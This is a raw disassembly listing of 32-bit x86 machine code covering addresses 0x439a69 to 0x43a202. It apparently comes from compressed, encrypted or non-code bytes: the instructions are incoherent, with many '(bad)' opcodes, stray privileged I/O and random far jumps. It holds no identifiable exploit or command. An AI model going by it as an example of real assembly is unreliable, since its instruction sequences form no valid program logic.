  439a69:	jmp    0x561820c2
  439a6e:	ror    DWORD PTR ds:0xa1560ab6,0xcb
  439a75:	jnp    0x439a2d
  439a77:	ret    
  439a78:	push   cs
  439a79:	sbb    al,0xa7
  439a7c:	xor    dl,al
  439a7e:	inc    ebp
  439a7f:	ins    DWORD PTR es:[edi],dx
  439a80:	jmp    0x439a5e
  439a82:	push   0x41c6e202
  439a87:	sub    cl,BYTE PTR [eax-0x24]
  439a8a:	jno    0x439ac9
  439a8c:	mov    al,0x81
  439a8e:	pusha  
  439a8f:	and    DWORD PTR [ebx],esp
  439a91:	int3   
  439a92:	xchg   bh,ah
  439a94:	mov    cl,0x30
  439a96:	xor    eax,0xb7a0b055
  439a9b:	in     al,0xd5
  439a9d:	ja     0x439a48
  439a9f:	add    dl,BYTE PTR [esi+0x2b692b58]
  439aa5:	add    al,0x9d
  439aa7:	(bad)  [esi+0x69]
  439aaa:	loope  0x439b11
  439aac:	popa   
  439aad:	popa   
  439aae:	mov    eax,ds:0xbc92cfde
  439ab3:	ret    0x6df7
  439ab6:	add    BYTE PTR [eax+0x4ab4855f],ah
  439abc:	mov    ebx,fs
  439abe:	mov    ch,BYTE PTR [eax+0x69]
  439ac1:	push   ebx
  439ac2:	push   esp
  439ac3:	pop    esi
  439ac4:	mov    esp,0x364e8663
  439ac9:	adc    BYTE PTR [edx+ecx*4+0x2e],ch
  439acd:	nop
  439ace:	jg     0x439ad5
  439ad0:	pop    ss
  439ad1:	xchg   DWORD PTR [eax-0x40],edx
  439ad4:	push   cs
  439ad5:	or     BYTE PTR [ecx-0x30],0xe7
  439ad9:	cmp    ebp,DWORD PTR [edx-0x20308ad2]
  439adf:	xchg   BYTE PTR [edi-0x4c],bl
  439ae2:	sub    dl,al
  439ae4:	loopne 0x439af0
  439ae6:	add    DWORD PTR ds:0xbdbab854,ebx
  439aec:	add    ah,al
  439aee:	(bad)
  439af2:	je     0x439a9f
  439af4:	stos   DWORD PTR es:[edi],eax
  439af5:	xor    BYTE PTR [esi],0x8d
  439af8:	xchg   DWORD PTR [esi],ebp
  439afa:	xchg   ecx,eax
  439afb:	cmp    dl,dh
  439afd:	pusha  
  439afe:	mov    ebx,0x1cf717d
  439b03:	not    al
  439b05:	repnz mov dl,0x21
  439b08:	mov    edi,0x6aab5ba6
  439b0d:	add    bl,0x20
  439b10:	enter  0x2c77,0x75
  439b14:	jmp    0x439ac0
  439b16:	add    BYTE PTR [ebx+0x5b],0x1a
  439b1a:	push   0x8266c3a
  439b1f:	jbe    0x439b66
  439b21:	adc    BYTE PTR [esi-0x7d],dh
  439b24:	pusha  
  439b25:	xchg   esp,eax
  439b26:	and    DWORD PTR [ebp+0x78972e85],0x4d
  439b2d:	jmp    0xb72005cd
  439b32:	push   edx
  439b33:	add    al,0x7a
  439b35:	imul   edx,DWORD PTR [esi+0x56],0xffffffc1
  439b39:	arpl   WORD PTR [edx-0x55f4b93b],di
  439b3f:	(bad)  
  439b41:	or     al,0x8c
  439b43:	xor    BYTE PTR [edx+0x3],ch
  439b46:	mov    al,0x3
  439b48:	imul   ecx
  439b4a:	dec    edx
  439b4b:	stos   DWORD PTR es:[edi],eax
  439b4c:	xchg   ebp,eax
  439b4d:	icebp  
  439b4e:	shl    BYTE PTR [edx+0x722d02ed],0x97
  439b55:	lds    ebx,FWORD PTR [ebp+0x5d]
  439b58:	adc    eax,0x187600ed
  439b5d:	dec    ebp
  439b5e:	fcom   DWORD PTR [edi+edi*8]
  439b61:	pop    edi
  439b62:	sub    eax,0x47769551
  439b67:	cmc    
  439b68:	paddq  mm6,QWORD PTR [edi+0x17620816]
  439b6f:	adc    eax,0x5068d66
  439b74:	add    eax,DWORD PTR [eax+0x3b]
  439b77:	xchg   ebx,eax
  439b78:	sbb    DWORD PTR [eax-0x62],ebp
  439b7b:	jecxz  0x439bde
  439b7d:	imul   eax,DWORD PTR [edi],0xba028504
  439b83:	cmc    
  439b84:	sbb    al,0x7
  439b86:	jbe    0x439b73
  439b88:	sub    ah,BYTE PTR [eax+0x3b]
  439b8b:	dec    ebx
  439b8c:	mov    cl,0x59
  439b8e:	or     bh,BYTE PTR [ecx-0x8]
  439b91:	stos   BYTE PTR es:[edi],al
  439b92:	dec    ebp
  439b93:	add    eax,0x37feaab7
  439b98:	push   esi
  439b99:	xchg   edi,eax
  439b9a:	test   BYTE PTR [ecx+esi*2-0x75bc765f],dh
  439ba1:	xor    al,0x69
  439ba3:	mov    eax,ds:0x96a25f93
  439ba8:	sbb    ebx,DWORD PTR [ebp+0x53]
  439bab:	xchg   DWORD PTR [ebx-0x29],ecx
  439bae:	pop    ds
  439baf:	xor    eax,0x683aa8ba
  439bb4:	sub    bl,al
  439bb6:	push   ebx
  439bb7:	lea    ecx,[ebp+0x58]
  439bba:	mov    al,ds:0x431620b6
  439bbf:	fnstenv [edi-0x5f72ea78]
  439bc5:	add    eax,ebp
  439bc7:	pop    ebp
  439bc8:	cli    
  439bc9:	outs   dx,BYTE PTR ds:[esi]
  439bca:	pop    ebp
  439bcb:	add    BYTE PTR [ebx],cl
  439bcd:	inc    ebp
  439bce:	sar    edx,cl
  439bd0:	push   0x50
  439bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439bd3:	ret    
  439bd4:	imul   esi,DWORD PTR [edi-0x56ca2eb6],0x4f
  439bdb:	adc    cl,BYTE PTR [edx]
  439bdd:	adc    DWORD PTR [edx],eax
  439bdf:	xor    al,0x76
  439be1:	add    DWORD PTR [ecx+ecx*8+0x60],esi
  439be5:	clc    
  439be6:	push   eax
  439be7:	ja     0x439c0a
  439be9:	mov    edx,DWORD PTR [esi-0x2f]
  439bec:	cs loop 0x439c63
  439bef:	jb     0x439c3b
  439bf1:	mov    cl,0x5a
  439bf3:	sbb    eax,0x30911b10
  439bf8:	je     0x439bdd
  439bfa:	repz push esp
  439bfc:	ins    DWORD PTR es:[edi],dx
  439bfd:	stos   BYTE PTR es:[edi],al
  439bfe:	test   al,0xd6
  439c00:	xor    DWORD PTR [esi],edi
  439c02:	jns    0x439b89
  439c04:	push   cs
  439c05:	mov    al,ds:0xfea67936
  439c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439c0b:	out    0x94,eax
  439c0d:	in     eax,dx
  439c0e:	(bad)  
  439c0f:	add    ecx,edx
  439c11:	hlt    
  439c12:	jp     0x439bda
  439c14:	(bad)  
  439c15:	(bad)  
  439c16:	sbb    ch,BYTE PTR [esp+ecx*4-0x49cbd1ea]
  439c1d:	push   eax
  439c1e:	xchg   ebp,eax
  439c1f:	adc    ebx,ebx
  439c21:	sub    edx,DWORD PTR [edi+eiz*2-0x4fc3debd]
  439c28:	ins    DWORD PTR es:[edi],dx
  439c29:	mov    al,ds:0x4ad46fbd
  439c2e:	jle    0x439c30
  439c30:	(bad)  
  439c31:	or     eax,DWORD PTR [edx+0x75486d6e]
  439c37:	cmp    BYTE PTR [eax+0x2e],0xa0
  439c3b:	push   edx
  439c3c:	jmp    0x99bc3ca7
  439c41:	dec    edx
  439c42:	jb     0x439c64
  439c44:	mov    edi,0xa8ea585f
  439c49:	loop   0x439c2c
  439c4b:	adc    eax,0xc19e918c
  439c50:	lods   eax,DWORD PTR ds:[esi]
  439c51:	bound  esp,QWORD PTR [ebx-0x6f025fa3]
  439c57:	xchg   BYTE PTR [ebp-0x42],bl
  439c5a:	fiadd  WORD PTR [edi]
  439c5c:	je     0x439c49
  439c5e:	mov    al,BYTE PTR [edi-0x10]
  439c61:	stos   DWORD PTR es:[edi],eax
  439c62:	lods   eax,DWORD PTR ds:[esi]
  439c63:	push   cs
  439c64:	jp     0x439c8e
  439c66:	dec    ebp
  439c67:	add    eax,0x615f452d
  439c6c:	cmc    
  439c6d:	stos   DWORD PTR es:[edi],eax
  439c6e:	mov    eax,ds:0x883e008e
  439c73:	clc    
  439c74:	outs   dx,DWORD PTR ds:[esi]
  439c75:	mov    BYTE PTR [eax+edx*8+0x10],bh
  439c79:	les    eax,FWORD PTR [ebp-0x48f989a5]
  439c7f:	push   edi
  439c80:	adc    al,0x44
  439c82:	mov    ebx,0x5eafba80
  439c87:	adc    eax,0x6a15fbb1
  439c8c:	imul   ebp,DWORD PTR [ecx+0x13],0xffffffe6
  439c90:	dec    edi
  439c91:	aam    0xe3
  439c93:	inc    ebp
  439c94:	in     eax,0x94
  439c96:	sub    BYTE PTR [esi+0x51],0xae
  439c9a:	inc    edi
  439c9b:	push   es
  439c9c:	ror    BYTE PTR [esp+ebp*1+0x6a21a234],1
  439ca3:	je     0x439cf2
  439ca5:	or     bh,BYTE PTR [ebx]
  439ca7:	mov    eax,ds:0x4bb4b2e2
  439cac:	mov    edi,0x33aa774c
  439cb1:	fidivr DWORD PTR [edx-0x34a74ae4]
  439cb7:	mov    edx,0xaca7a1b5
  439cbc:	fisttp DWORD PTR [edx]
  439cbe:	popa   
  439cbf:	(bad)  
  439cc1:	cli    
  439cc2:	pop    ecx
  439cc3:	outs   dx,DWORD PTR ds:[esi]
  439cc4:	pop    ss
  439cc5:	iret   
  439cc6:	fst    QWORD PTR [esp+esi*1+0x51]
  439cca:	jno    0x439ced
  439ccc:	cmp    BYTE PTR [ebx],cl
  439cce:	pop    ss
  439ccf:	lds    esi,FWORD PTR [edx-0x7f3cd48b]
  439cd5:	lds    edi,FWORD PTR [ebp+0x54a031cd]
  439cdb:	jno    0x439ce0
  439cdd:	loopne 0x439cfa
  439cdf:	(bad)  
  439ce0:	(bad)  
  439ce1:	and    al,0xb1
  439ce3:	stos   DWORD PTR es:[edi],eax
  439ce4:	stos   BYTE PTR es:[edi],al
  439ce5:	jbe    0x439c9a
  439ce7:	push   ecx
  439ce8:	sbb    eax,edi
  439cea:	xor    eax,esp
  439cec:	ss add eax,0x8690b6c0
  439cf2:	adc    eax,esp
  439cf4:	test   eax,0x40db2cdf
  439cf9:	mov    al,0x23
  439cfb:	loopne 0x439d4f
  439cfd:	jecxz  0x439c82
  439cff:	mov    cl,0xeb
  439d01:	outs   dx,BYTE PTR ds:[esi]
  439d02:	dec    ebx
  439d03:	dec    ebx
  439d04:	sbb    ebp,DWORD PTR [ebp+0x6a]
  439d07:	fisub  DWORD PTR [edi]
  439d09:	test   BYTE PTR [edx],0xd1
  439d0c:	or     esi,DWORD PTR [eax+0x1]
  439d0f:	ins    BYTE PTR es:[edi],dx
  439d10:	or     BYTE PTR [ebx-0x5],0x23
  439d14:	mov    esp,0xddc01214
  439d19:	cli    
  439d1a:	mov    eax,0x80bc3775
  439d1f:	stos   DWORD PTR es:[edi],eax
  439d20:	dec    esp
  439d21:	adc    eax,0xb92401ec
  439d26:	add    ch,BYTE PTR [eax+0x53]
  439d29:	adc    edx,edi
  439d2b:	outs   dx,DWORD PTR ds:[esi]
  439d2c:	pop    edx
  439d2d:	push   ebp
  439d2e:	pop    ss
  439d2f:	mov    dh,0x9a
  439d31:	xchg   ebp,eax
  439d32:	add    al,0x8e
  439d34:	or     BYTE PTR [edi],al
  439d36:	sub    edx,ebp
  439d38:	test   al,0xba
  439d3a:	ins    DWORD PTR es:[edi],dx
  439d3b:	pop    ebp
  439d3c:	les    eax,FWORD PTR [edi]
  439d3e:	(bad)  
  439d3f:	in     al,dx
  439d40:	xchg   edx,eax
  439d41:	inc    ecx
  439d42:	jge    0x439cf5
  439d44:	sub    eax,0x8fda6b7
  439d49:	add    dl,BYTE PTR [esi-0x7d]
  439d4c:	ret    0xdbbc
  439d4f:	mov    eax,0x290136d1
  439d54:	add    bl,BYTE PTR [edx-0x4b55b42f]
  439d5a:	add    eax,0x2e883b54
  439d5f:	xchg   esp,eax
  439d60:	xchg   ecx,eax
  439d61:	or     ch,al
  439d63:	(bad)  
  439d64:	(bad)  
  439d65:	loopne 0x439d39
  439d67:	mov    WORD PTR [esi],ds
  439d69:	sub    eax,0x6db0b527
  439d6e:	xchg   BYTE PTR [edx],bl
  439d70:	das    
  439d71:	test   edi,edx
  439d73:	stos   BYTE PTR es:[edi],al
  439d74:	aaa    
  439d75:	clc    
  439d76:	cld    
  439d77:	pusha  
  439d78:	inc    edi
  439d79:	mov    ah,0x14
  439d7b:	jo     0x439d35
  439d7d:	aad    0x92
  439d7f:	cmp    ecx,DWORD PTR [esi]
  439d81:	pop    es
  439d82:	ins    BYTE PTR es:[edi],dx
  439d83:	sbb    eax,DWORD PTR [edx+0x6c29898b]
  439d89:	mov    cl,0x54
  439d8b:	or     eax,0x9badb750
  439d90:	int    0xf5
  439d92:	jp     0x439d8c
  439d94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439d95:	mov    gs,WORD PTR [edi+0x6e8fb755]
  439d9b:	jmp    0x3bf5a451
  439da0:	ret    0x1250
  439da3:	test   al,0x1b
  439da5:	test   DWORD PTR ds:0xd02db400,ebx
  439dab:	mov    ds:0xb6db51d3,al
  439db0:	lods   eax,DWORD PTR ds:[esi]
  439db1:	mov    ds:0xc2fb450e,eax
  439db6:	and    esi,ecx
  439db8:	outs   dx,BYTE PTR ds:[esi]
  439db9:	push   eax
  439dba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439dbb:	ficom  DWORD PTR [ecx]
  439dbd:	aad    0x6d
  439dbf:	outs   dx,DWORD PTR ds:[esi]
  439dc0:	xchg   BYTE PTR [ebp-0x4f],bh
  439dc3:	dec    eax
  439dc4:	mov    esp,0xaeb7408a
  439dc9:	sub    BYTE PTR [eax],0xd5
  439dcc:	sub    al,0x3e
  439dce:	jmp    0x138688cb
  439dd3:	push   es
  439dd4:	xchg   edi,eax
  439dd5:	xor    al,0x53
  439dd7:	pop    ss
  439dd8:	adc    al,0x97
  439dda:	jo     0x439e30
  439ddc:	mov    al,0x5d
  439dde:	jns    0x439d71
  439de0:	jbe    0x439e47
  439de2:	add    cl,ch
  439de4:	mov    dh,0x85
  439de6:	mov    ds:0x242dcc51,al
  439deb:	jne    0x439e43
  439ded:	jbe    0x439e25
  439def:	adc    eax,0x2efea9b0
  439df4:	mov    al,0xa9
  439df6:	fisubr DWORD PTR [ecx-0x2aff492b]
  439dfc:	jecxz  0x439de6
  439dfe:	loopne 0x439df5
  439e00:	jnp    0x439e1d
  439e02:	xor    BYTE PTR [esi],0x15
  439e05:	test   al,0xf4
  439e07:	mov    eax,ds:0xa23aaa1d
  439e0c:	add    DWORD PTR ss:[ebx-0x8],ecx
  439e10:	push   ecx
  439e11:	pop    eax
  439e12:	daa    
  439e13:	or     BYTE PTR [eax-0x6e5248a],ch
  439e19:	xor    DWORD PTR [ebx+0x40f77d38],esi
  439e1f:	sbb    eax,0xd4c2050b
  439e24:	imul   esp,DWORD PTR [eax],0x28f6d3f4
  439e2a:	cmp    DWORD PTR [edx+0x1766a00b],esp
  439e30:	dec    DWORD PTR [eax-0x765275eb]
  439e36:	retf   
  439e37:	mov    eax,ds:0x408a6b92
  439e3c:	mov    ch,0x10
  439e3e:	mov    ch,0x11
  439e40:	mov    BYTE PTR [ebx+ebx*8],bh
  439e43:	or     ch,BYTE PTR es:[esi+0xd]
  439e47:	add    bh,BYTE PTR [eax-0x14dd3462]
  439e4d:	sbb    ebp,DWORD PTR [edx-0x22d35f4a]
  439e53:	aam    0xca
  439e55:	xchg   edx,eax
  439e56:	ss loop 0x439eaf
  439e59:	inc    edi
  439e5a:	push   eax
  439e5b:	fbstp  TBYTE PTR [eax+0x22]
  439e5e:	adc    al,0xd9
  439e60:	xor    al,0xd0
  439e62:	mov    dh,0x89
  439e64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439e65:	pop    ebx
  439e66:	icebp  
  439e67:	(bad)  
  439e68:	and    ecx,DWORD PTR [ecx-0x4fffb24d]
  439e6e:	add    al,0xe2
  439e70:	jmp    0x619225e
  439e75:	mov    cl,0x40
  439e77:	ficomp DWORD PTR [ebp-0x5fd9d207]
  439e7d:	cli    
  439e7e:	adc    BYTE PTR [edi-0x78],ch
  439e81:	shl    DWORD PTR [ebx],1
  439e83:	push   ecx
  439e84:	je     0x439e86
  439e86:	aam    0x86
  439e88:	repz cdq 
  439e8a:	xor    eax,0xadda176a
  439e8f:	out    0x44,al
  439e91:	and    DWORD PTR [esi-0x59dc11bf],esi
  439e97:	das    
  439e98:	push   es
  439e99:	in     eax,dx
  439e9a:	(bad)  
  439e9b:	and    dl,dh
  439e9d:	mov    DWORD PTR [edi-0x348e2b59],edi
  439ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439ea4:	adc    dl,ch
  439ea6:	add    eax,0x1b394730
  439eab:	movntps XMMWORD PTR [eax+0x13],xmm5
  439eaf:	push   ecx
  439eb0:	adc    al,0x90
  439eb2:	xrstors [edx-0x7e]
  439eb6:	mov    dh,0xad
  439eb8:	aad    0xb0
  439eba:	xchg   ecx,eax
  439ebb:	(bad)  
  439ebc:	aam    0xf6
  439ebe:	shr    DWORD PTR [edx+0x2383a376],cl
  439ec4:	jecxz  0x439ea7
  439ec6:	push   esi
  439ec7:	mov    cl,0x29
  439ec9:	adc    al,0x9b
  439ecb:	mov    ds:0xdc2de6b6,al
  439ed0:	pop    ebx
  439ed1:	sub    esp,DWORD PTR [ecx-0x25]
  439ed4:	and    dh,BYTE PTR [edx+0x6e]
  439ed7:	outs   dx,DWORD PTR ds:[esi]
  439ed8:	(bad)  
  439ed9:	ds xchg edi,eax
  439edb:	mov    ecx,DWORD PTR [ebx]
  439edd:	in     eax,dx
  439ede:	push   esi
  439edf:	jle    0x439e92
  439ee1:	lds    eax,FWORD PTR [eax]
  439ee3:	rcl    BYTE PTR [edi-0x20],0x1
  439ee7:	mov    esi,0x409d85cc
  439eec:	(bad)  [esi-0x4601d7ec]
  439ef2:	push   ss
  439ef3:	clc    
  439ef4:	out    0xea,eax
  439ef6:	(bad)  
  439ef7:	outs   dx,BYTE PTR ds:[esi]
  439ef8:	sbb    eax,0x26bf1faf
  439efd:	push   0x50
  439eff:	jmp    0xda5b8522
  439f04:	mov    BYTE PTR [esi],0x36
  439f07:	lea    ecx,[esi+edx*4]
  439f0a:	retf   
  439f0b:	add    dl,BYTE PTR [ebx]
  439f0d:	dec    esi
  439f0e:	pop    ds
  439f0f:	inc    ecx
  439f10:	ins    DWORD PTR es:[edi],dx
  439f11:	adc    edx,DWORD PTR [edx+ebp*2]
  439f14:	out    0x9a,al
  439f16:	lea    esp,gs:[ebp+0x31476da8]
  439f1d:	ja     0x439f1d
  439f1f:	xchg   esi,eax
  439f20:	cmp    DWORD PTR [edx-0x14],ebp
  439f23:	mov    ds:0xfd9072a2,al
  439f28:	int3   
  439f29:	fisubr WORD PTR [ebp+0x74]
  439f2c:	inc    eax
  439f2d:	pop    esp
  439f2e:	jge    0x439edb
  439f30:	xor    BYTE PTR [edi+0x1b653f8e],cl
  439f36:	mov    bh,0xad
  439f38:	push   es
  439f39:	retf   0x323d
  439f3c:	push   esi
  439f3d:	fstp   QWORD PTR [edi+edi*1+0x15]
  439f41:	add    DWORD PTR [eax+0x41691f4b],0x7f0ba7e3
  439f4b:	les    esi,FWORD PTR [esi+0x61]
  439f4e:	stos   DWORD PTR es:[edi],eax
  439f4f:	fwait
  439f50:	cmp    eax,0x6dc7c471
  439f55:	jp     0x439f78
  439f57:	or     dl,BYTE PTR [esi]
  439f59:	jbe    0x439fb0
  439f5b:	sub    DWORD PTR [edi+0x5],ebp
  439f5e:	mov    fs,esi
  439f60:	lea    esi,[esi-0x5f]
  439f63:	mov    ds:0x4a25cd57,eax
  439f68:	sub    ah,BYTE PTR [ecx-0x24923ee2]
  439f6e:	mov    dh,0xec
  439f70:	jmp    0x3eb0e380
  439f75:	cmp    esp,DWORD PTR cs:[eax]
  439f78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439f79:	mov    ds:0x4245db5b,al
  439f7e:	pop    edi
  439f7f:	xor    dl,BYTE PTR [ebp-0x7a7f6ae6]
  439f85:	jbe    0x439f72
  439f87:	mov    BYTE PTR [eax],bl
  439f89:	ret    0x8544
  439f8c:	repnz mov DWORD PTR [eax-0x40],esi
  439f90:	inc    eax
  439f91:	ror    BYTE PTR [ebp+0x73d1c033],0xc1
  439f98:	push   ebp
  439f99:	adc    BYTE PTR [ebx-0x49],cl
  439f9c:	scas   eax,DWORD PTR es:[edi]
  439f9d:	out    0x7f,al
  439f9f:	into   
  439fa0:	daa    
  439fa1:	jmp    0x439fc5
  439fa3:	loopne 0x439f7b
  439fa5:	push   ds
  439fa6:	mov    cs,WORD PTR [ebx]
  439fa8:	icebp  
  439fa9:	jns    0x439fd0
  439fab:	adc    ch,BYTE PTR [eax+eax*4]
  439fae:	or     ebp,DWORD PTR ds:0x49ba9a6a
  439fb4:	jbe    0x43a011
  439fb6:	adc    BYTE PTR [esi-0x4b5d7980],0x76
  439fbd:	ror    BYTE PTR [edx+0x7f86c40d],0x3d
  439fc4:	and    BYTE PTR [eax-0x44],al
  439fc7:	xchg   esp,eax
  439fc8:	dec    ebp
  439fc9:	push   eax
  439fca:	ins    BYTE PTR es:[edi],dx
  439fcb:	sub    BYTE PTR [ecx],al
  439fcd:	popa   
  439fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439fcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439fd0:	xchg   ebx,eax
  439fd1:	push   ss
  439fd2:	add    BYTE PTR [esi+0x3aff9a80],0x72
  439fd9:	mov    edx,0x2026d557
  439fde:	clc    
  439fdf:	mov    ebp,0xec51a0b2
  439fe4:	and    BYTE PTR [eax-0x3b],ah
  439fe7:	stos   BYTE PTR es:[edi],al
  439fe8:	outs   dx,DWORD PTR ds:[esi]
  439fe9:	int    0x82
  439feb:	or     DWORD PTR [eax-0x2a5cbca5],eax
  439ff1:	and    cl,bl
  439ff3:	xchg   esi,eax
  439ff4:	hlt    
  439ff5:	inc    eax
  439ff6:	pop    ss
  439ff7:	pop    eax
  439ff8:	mov    ds:0x48e57ce1,al
  439ffd:	jmp    0x432c4b48
  43a002:	add    edx,ecx
  43a004:	icebp  
  43a005:	push   ss
  43a006:	cmc    
  43a007:	jp     0x43a071
  43a009:	xor    eax,0xfdad85c5
  43a00e:	mov    WORD PTR [ecx],es
  43a010:	cmp    al,BYTE PTR ds:0xae0dbbea
  43a016:	sbb    al,0x2e
  43a019:	sbb    eax,0xdac2ce11
  43a01e:	mov    ecx,0xd4476d96
  43a023:	push   ds
  43a024:	adc    ah,BYTE PTR [eax]
  43a026:	inc    edx
  43a027:	or     al,BYTE PTR [edx]
  43a029:	push   es
  43a02a:	and    bh,BYTE PTR [eax+0x2e596595]
  43a030:	cmp    dh,BYTE PTR [esi]
  43a032:	retf   
  43a033:	ds fist DWORD PTR ds:0x3635a3b1
  43a03b:	es aam 0x2e
  43a03e:	push   cs
  43a03f:	(bad)  
  43a040:	and    ebx,DWORD PTR [edx+0x68]
  43a043:	push   ecx
  43a044:	pop    ss
  43a045:	jns    0x43a069
  43a047:	loope  0x43a034
  43a049:	mov    ds:0x1aff46ea,al
  43a04e:	retf   0x121e
  43a051:	xchg   ebp,eax
  43a052:	add    bl,dl
  43a054:	add    eax,0x7aee0e74
  43a059:	push   es
  43a05a:	not    BYTE PTR [eax-0x3b]
  43a05d:	lods   eax,DWORD PTR ds:[esi]
  43a05e:	xchg   BYTE PTR [ebp+0x6afa37fe],ch
  43a064:	pop    ebp
  43a065:	push   0xf2163514
  43a06a:	sub    ebp,eax
  43a06c:	jmp    0xefa2:0x5802b5a
  43a073:	rcl    DWORD PTR [edx-0x7e5fff1d],0xad
  43a07a:	sbb    al,0x5
  43a07c:	or     bh,cl
  43a07e:	mov    WORD PTR [esi],gs
  43a080:	xor    eax,0x2c2d6d00
  43a085:	xchg   cl,ch
  43a087:	xor    al,0xef
  43a089:	xor    bl,bh
  43a08b:	add    eax,0x4e2aa1b0
  43a090:	sub    bl,dh
  43a092:	push   ecx
  43a093:	add    BYTE PTR [ebp+0x26e7691c],al
  43a099:	and    BYTE PTR [eax+0x6718c6d0],bh
  43a09f:	adc    al,0xdf
  43a0a1:	jle    0x43a0e7
  43a0a3:	push   ebx
  43a0a4:	(bad)  
  43a0a5:	(bad)  
  43a0a6:	(bad)  
  43a0a8:	inc    ebx
  43a0a9:	rol    DWORD PTR [edi-0x2bf89c20],cl
  43a0af:	inc    esi
  43a0b0:	jns    0x43a079
  43a0b2:	(bad)  
  43a0b3:	hlt    
  43a0b4:	aas    
  43a0b5:	lahf   
  43a0b6:	push   0xf46e2a8
  43a0bb:	jl     0x43a0f4
  43a0bd:	lock fs pop ebx
  43a0c0:	adc    ebx,ebp
  43a0c2:	fdiv   DWORD PTR [ecx+0x274c2740]
  43a0c8:	aas    
  43a0c9:	push   esp
  43a0ca:	mov    al,0x90
  43a0cc:	push   edi
  43a0cd:	adc    ebp,ebp
  43a0cf:	mov    ds:0xa2880e2b,al
  43a0d4:	pushf  
  43a0d5:	rol    DWORD PTR [edi+0x23a05b8d],0xac
  43a0dc:	ja     0x43a0bf
  43a0de:	mov    bl,0x49
  43a0e0:	mov    al,0x8b
  43a0e2:	push   ebp
  43a0e3:	mov    edx,0xa84a5035
  43a0e8:	imul   esp,DWORD PTR [edi+ebx*4+0xf0ba5b3],0x41
  43a0f0:	scas   eax,DWORD PTR es:[edi]
  43a0f1:	cwde   
  43a0f2:	dec    esp
  43a0f3:	xchg   esp,eax
  43a0f4:	scas   eax,DWORD PTR es:[edi]
  43a0f5:	sahf   
  43a0f6:	push   ebp
  43a0f7:	jno    0x43a09a
  43a0f9:	adc    eax,0xa348af15
  43a0fe:	mov    eax,0xa8d46c2d
  43a103:	pusha  
  43a104:	pop    ds
  43a105:	ins    BYTE PTR es:[edi],dx
  43a106:	mov    al,ds:0x4f742f78
  43a10b:	add    eax,0x45a806d4
  43a110:	cld    
  43a111:	inc    edi
  43a112:	lea    ebp,[esi]
  43a114:	or     dh,BYTE PTR [esi+0x30]
  43a117:	in     al,0x5f
  43a119:	xchg   esp,ecx
  43a11b:	js     0x43a0cf
  43a11d:	cdq    
  43a11e:	fisubr DWORD PTR [eax-0x1b9ccf28]
  43a124:	mov    edi,0x2cb2cb3b
  43a129:	retf   
  43a12a:	lsl    esi,WORD PTR [edi+0x6b]
  43a12e:	pop    edi
  43a12f:	xor    ebp,DWORD PTR [ebx+ecx*8]
  43a132:	mov    dl,0x2c
  43a134:	aaa    
  43a135:	cmp    edi,DWORD PTR [edi]
  43a137:	and    esp,DWORD PTR [edi]
  43a139:	mov    dl,0x2c
  43a13b:	retf   
  43a13c:	mov    dl,0x2b
  43a13e:	das    
  43a13f:	adc    edx,DWORD PTR [edi]
  43a141:	sbb    ecx,ebx
  43a143:	mov    dl,0x2c
  43a145:	retf   
  43a146:	pop    ds
  43a147:	add    eax,DWORD PTR [edi]
  43a149:	or     ecx,DWORD PTR [edi]
  43a14b:	repz sub al,0xcb
  43a14e:	mov    dl,0x2c
  43a150:	idiv   ebx
  43a152:	jmp    ebx
  43a154:	out    0xb2,eax
  43a156:	sub    al,0xcb
  43a158:	mov    dl,0xeb
  43a15a:	out    dx,eax
  43a15b:	shr    BYTE PTR [ecx],1
  43a15d:	int3   
  43a15e:	retf   
  43a15f:	mov    dl,0x2c
  43a161:	retf   
  43a162:	(bad)  
  43a163:	fadd   st(4),st
  43a165:	int3   
  43a166:	les    edi,FWORD PTR [esp+ebp*1-0x47d34d35]
  43a16d:	mov    ah,0xb0
  43a16f:	lods   al,BYTE PTR ds:[esi]
  43a170:	test   al,0xb2
  43a172:	sub    al,0xcb
  43a174:	mov    dl,0xa4
  43a176:	mov    al,ds:0xcb94989c
  43a17b:	mov    dl,0x2c
  43a17d:	retf   
  43a17e:	nop
  43a17f:	mov    WORD PTR [eax+0x2c7c8084],cs
  43a185:	retf   
  43a186:	mov    dl,0x2c
  43a188:	js     0x43a1fe
  43a18a:	jo     0x43a1f8
  43a18c:	push   0xb2cb2c00
  43a191:	fs pusha 
  43a193:	pop    esp
  43a194:	popf   
  43a195:	call   0x49155460
  43a19a:	adc    BYTE PTR [ecx],ah
  43a19c:	adc    eax,0xa20b2d0e
  43a1a1:	mov    dl,0x6c
  43a1a3:	fwait
  43a1a4:	and    bl,BYTE PTR [ecx]
  43a1a6:	pop    ecx
  43a1a7:	ret    0x23bf
  43a1aa:	das    
  43a1ab:	retf   
  43a1ac:	mov    dl,0x2c
  43a1ae:	retf   
  43a1af:	sub    esi,DWORD PTR [edi]
  43a1b1:	xor    edi,DWORD PTR [edi]
  43a1b3:	sub    eax,DWORD PTR [edi]
  43a1b5:	sub    al,0xcb
  43a1b7:	mov    dl,0x2c
  43a1b9:	add    ecx,DWORD PTR [edi]
  43a1bb:	or     edx,DWORD PTR [edi]
  43a1bd:	adc    esi,DWORD PTR [edx+0x1fb2cb2c]
  43a1c3:	sbb    esp,edi
  43a1c5:	jecxz  0x43a1b6
  43a1c7:	retf   
  43a1c8:	mov    dl,0x2c
  43a1ca:	retf   
  43a1cb:	jmp    0x43a1c4
  43a1cd:	repz (bad) 
  43a1cf:	sti    
  43a1d0:	shr    DWORD PTR [ebx+ecx*8],0xb2
  43a1d4:	sub    al,0x2f
  43a1d6:	loope  0x43a1d5
  43a1d8:	jmp    0xf9a938b2
  43a1dd:	mov    dl,0xd1
  43a1df:	iret   
  43a1e0:	add    BYTE PTR [ecx-0x59],al
  43a1e3:	mov    ds:0x9658abaf,eax
  43a1e8:	gs pop ecx
  43a1ea:	mov    bh,0xb3
  43a1ec:	mov    edi,0xda3787bb
  43a1f1:	mov    gs,WORD PTR [eax+0x24c9931]
  43a1f7:	and    DWORD PTR [esi-0x69],edi
  43a1fa:	mov    edx,0xb06c1435
  43a1ff:	jae    0x43a202
  43a201:	pushf  
  43a202:	into   
